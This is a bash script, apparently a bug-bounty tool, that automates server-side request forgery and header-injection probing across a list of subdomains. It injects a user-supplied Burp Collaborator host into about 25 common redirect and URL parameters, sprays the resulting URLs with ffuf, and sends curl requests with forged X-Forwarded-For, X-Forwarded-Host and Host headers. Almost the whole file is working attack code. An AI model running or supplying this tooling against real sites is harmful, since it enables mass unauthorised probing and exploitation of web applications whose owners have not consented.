#!/bin/bash

cat << "EOF"
                  I'M WHAT I'M BECAUSE WHAT OF WE ALL ARE.
                    - X0R3R0xF
EOF
sleep 1
### Dirs Preparing..
subdomains=$1
### End Dirs Preparing

echo -n "Enter your collaborator e.g. [xyz.collaborator.com]:  "
read burpcollaborator


cat ../x0rarchiv/results/GFvulns/ssrf.txt | grep "=" | qsreplace "$burpcollaborator" >> ssrfv.txt
ffuf -c -w ssrfv.txt -u FUZZ


 printf "
\e[96m##################################################\e[0m
   \e[96mSSRF Spraying ~ \e[0m \e[31mSubdomains\e[0m
\e[96m##################################################\e[0m
"
declare -a topssrfparam=("dest=$burpcollaborator" "redirect=$burpcollaborator" "uri=$burpcollaborator
" "path=http://$burpcollaborator
" "continue=http://$burpcollaborator
" "url=http://$burpcollaborator
" "window=http://$burpcollaborator
" "next=http://$burpcollaborator
" "data=http://$burpcollaborator
" "reference=http://$burpcollaborator
" "site=http://$burpcollaborator
" "html=http://$burpcollaborator
" "val=http://$burpcollaborator
" "validate=http://$burpcollaborator
" "domain=http://$burpcollaborator
" "callback=http://$burpcollaborator
" "return=http://$burpcollaborator
" "page=http://$burpcollaborator
" "feed=http://$burpcollaborator
" "host=http://$burpcollaborator
" "port=http://$burpcollaborator
" "to=http://$burpcollaborator
" "out=http://$burpcollaborator
" "view=http://$burpcollaborator
" "dir=http://$burpcollaborator")

FILE=ssrf_SubSpray.txt
if test -f "$FILE"; then
    rm -rf ssrf_SubSpray.txt
fi

for domain in $(cat $subdomains); do
  for ssrfparam in "${topssrfparam[@]}"; do
    echo $domain"/?"$ssrfparam >> ssrf_SubSpray.txt
  done;
done;
ffuf -c -w ssrf_SubSpray.txt -u FUZZ


FILE=ssrf_endSpray.txt
if test -f "$FILE"; then
    rm -rf ssrf_endSpray.txt
fi
for endpoint in $(cat ../x0rarchiv/results/all-InOne.txt | grep "="); do
  for ssrfparam in "${topssrfparam[@]}"; do
    echo $endpoint"&"$ssrfparam >> ssrf_endSpray.txt
  done;
done;

ffuf -c -w ssrf_endSpray.txt -u FUZZ

 printf "
\e[96m##################################################\e[0m
   \e[96m Header and request body XSS , SSRF Checking ~ \e[0m \e[31mCURL\e[0m
\e[96m##################################################\e[0m
"

for url in $(cat $subdomains);
do
xss1=$(curl -s -L $url -H "X-Forwarded-For: xss.$burpcollaborator" | grep xss)
xss2=$(curl -s -L $url -H "X-Forwarded-Host: xss.$burpcollaborator"| grep xss)
xss3=$(curl -s -L $url -H"'Host: xss.$burpcollaborator"|grep xss)
xss4=$(curl -s -L $url --request-target http://$burpcollaborator/ --max-time 2);
echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.$burpcollaborator HTTP/1.1 ""\n";
done

